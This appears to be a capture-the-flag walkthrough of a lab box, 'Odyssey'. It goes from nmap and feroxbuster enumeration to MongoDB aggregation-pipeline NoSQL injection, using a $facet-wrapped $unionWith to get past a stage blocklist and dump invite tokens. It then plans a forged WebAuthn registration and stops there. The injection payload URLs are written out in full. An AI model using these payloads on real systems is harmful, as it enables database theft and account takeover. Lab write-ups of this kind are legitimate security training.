# Odyssey

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.45.112

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/ghostlink_tcp.htb $ip
# 3000/tcp open  ppp




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/ghostlink_tcp $ip
# 3000/tcp open     http         Node.js Express framework
# |_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/ghostlink_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts file and discover the APP**

{% code overflow="wrap" %}
```bash
echo "$ip aegis.korvia.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Technology Stack**

* **Backend**: Node.js with Express framework
* **Frontend**: Likely a single-page app (SPA) given the modern UI
* **Authentication**: FIDO2/WebAuthn hardware authenticator support



**Key Observations**

* Requires an "operator handle" in format `surname.initial` (e.g., `smith.j`)
* Uses hardware authenticators (YubiKey, FIDO2 devices)
* This is a "Directorate 9" restricted system
{% endhint %}

<mark style="color:blue;">**Step 3**</mark>

**however its a modern app that may be difficult but always deep enumration may lead to something interesting**&#x20;

{% code overflow="wrap" %}
```bash
/api/v1/aegis-mds/search

"_id":"69f49023225fb3c680909240","aaguid":"566581a4-5a65-9f87-c652-52851474f127","vendor":"Yubico","description":"YubiKey 5C","protocolFamily":"fido2","schema":3,"authenticatorVersion":100,"upv"
```
{% endcode %}

{% hint style="info" %}
**Looking at this \_id its predictable and give me a probablity thats its a MangoDB Database because the way we write the entry ID and also the value if we compare two value :**

{% code overflow="wrap" %}
```bash
69f49023 225fb3c680  909240
69f49023 225fb3c680  909241
69f49023 225fb3c680  909242
69f49023 225fb3c680  909243

# its a timestamp + same random value + INCREMENT COUNT
# the JSON in the request is a nested JSON because we see a nested array of some object so it's a binary JSON that make a probability that we deal with MongoDB 
```
{% endcode %}
{% endhint %}

**and in the webauth.js we found interesting endpoint**&#x20;

{% code overflow="wrap" %}
```js
async function register(inviteToken) {
    var opts = await postJSON('/api/v1/auth/webauthn/register/begin', { invite_token: inviteToken });
    opts.challenge = b64uToBuf(opts.challenge);
    opts.user.id = b64uToBuf(opts.user.id);
    if (opts.excludeCredentials) {
      opts.excludeCredentials = opts.excludeCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
        

var resp = {
      id: cred.id,
      rawId: bufToB64u(cred.rawId),
      type: cred.type,
      response: {
        clientDataJSON: bufToB64u(cred.response.clientDataJSON),
        attestationObject: bufToB64u(cred.response.attestationObject),
      },
      clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
    };
    return await postJSON('/api/v1/auth/webauthn/register/finish', resp);
  }


 async function authenticate() {
    var opts = await postJSON('/api/v1/auth/webauthn/auth/begin', {});
    opts.challenge = b64uToBuf(opts.challenge);
    if (opts.allowCredentials) {
      opts.allowCredentials = opts.allowCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
      });
```
{% endcode %}

**Now to start our main idea is to find a way to steal the token i tried many nosql injection but it doesnt give me anything so we still search on the web app**

<mark style="color:blue;">**Step 4**</mark>&#x20;

[https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines)

**I found this blog that its talking abount nosql injection with aggragations pipelines since the sites uses pipelines it cound be an attack vector**

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q[$gt]=5&limit=1 

{"error":"InvalidQueryShape","detail":"Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.","trace_id":"mds-2a1e4d"}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline[$gt]=12&limit=1
# this give me 400 bad request so we may be need to update the request 
```
{% endcode %}

**I tried a multipe things and paylaod but i think am on a dead end or still need something so i need to search more**&#x20;

**i start fuzzing from scartch the /api/v1 because am sure its our entry point we need just to leak the token**&#x20;

{% code overflow="wrap" %}
```bash
feroxbuster --url http://aegis.korvia.htb:3000/api/v1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --force-recursion -t 50 

feroxbuster --url http://aegis.korvia.htb:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -m GET,POST,PUT,DELETE,OPTIONS,HEAD --status-codes 200,301,302,400,500 --filter-size 28
# 400      GET       66l      184w     2543c http://aegis.korvia.htb:3000/onboard
```
{% endcode %}

**i get it after 3 hours of fuzzing LoL !!, this  endpoints looks interesting**&#x20;

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/onboard/13213223
# No matching record in pending_invites  (token may have been redeemed, expired, or never issued)
```
{% endcode %}

**We uncovered the exact name of the database collection we need to attack &#x20;**<mark style="color:red;">**(pending\_invites)**</mark>

**I think this is what we miss in our NoSQL injection**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{}}],"as":"invites"}},{"$project":{"invites":1,"_id":0}},{"$unwind":"$invites"},{"$replaceRoot":{"newRoot":"$invites"}}]&limit=1

{"error":"invalid or disallowed pipeline stage"}
```
{% endcode %}

**So i think we hit a defense mecanism now the $match is blocked we try other stages, so to build the best payload we need to have an idea if basic sanity injcetion pass**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$match":{"vendor":"Yubico"}}]&limit=1

and it pass it return Yubico
```
{% endcode %}

**i tried $unionWith and also its blocked**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$project":{"vendor":1}}]&limit=1 

it pass it reveal all vendors
```
{% endcode %}

**But we need to read the tokens from pending\_invites**

**i will test $facet that run multipe stage in parallel it may bypass the blacklisted ones**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$facet":{"tokens":[{"$unionWith":{"coll":"pending_invites"}}]}}]&limit=1

and boom it pass i have all tokens of all vendors
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Le'ts make things together**

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**when i check all data there is one token that get expired at 2126 all others already expired**&#x20;

{% code overflow="wrap" %}
```json
{"_id":"69f49023225fb3c680909274","operator_id":"op-2026-0042","role":"Operator","token":"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238","issued_by":"ao-mreyes","issued_at":"2026-04-15T08:00:00.000Z","expires_at":"2126-05-15T00:00:00.000Z","redeemed":false,"pipeline":"forge-recruitment","clearance_target":"Δ-3"}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**so the main idea is when we try to register from the browser it doesnt pass because its like you do a request outside the browser so using devtools we will try to create a virtual webauth like its coming from localhost , the idea is to perform a virtual web auth on chrome but we need to change some confis on chrome to make the site secure and trusted by chrome to get the Webauth catched on devtools**

1. `chrome://flags/#unsafely-treat-insecure-origin-as-secure`
2. search  Insecure origins treated as secure
3. [http://aegis.korvia.htb:3000](http://aegis.korvia.htb:3000) and enabled then relaunch&#x20;

<br>

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**it the same problem but we get much inforamtion from here so the solutions is to build a python or C script that do this we have an idea of have the key is build and all things** <br>

{% code overflow="wrap" %}
```html
PublicKeyCredentialCreationOptions
"rp": 
"id": "aegis.korvia.htb",
"name": "AEGIS — Sovereign Signing & Attestation Authority"
},
"user": 
"id": "b3AtMjAyNi0wMDQy",
"name": "op-2026-0042",
"displayName": "op-2026-0042"
},
"challenge": "0VDyTM-dskfX-Tq0iC2LkucaWtkDWApcZSnAhlts7_w",
"pubKeyCredParams": 
"type": "public-key",
"alg": -7
},
"type": "public-key",
"alg": -257
}
],
"timeout": 60000,
"authenticatorSelection": 
"residentKey"
: "required",
"userVerification"
: "preferred",
"requireResidentKey"
: true
},
"attestation": "none",
"extensions": 
"credProps": true
}
}
```
{% endcode %}

**so i use the QWEN ai to build the script**&#x20;

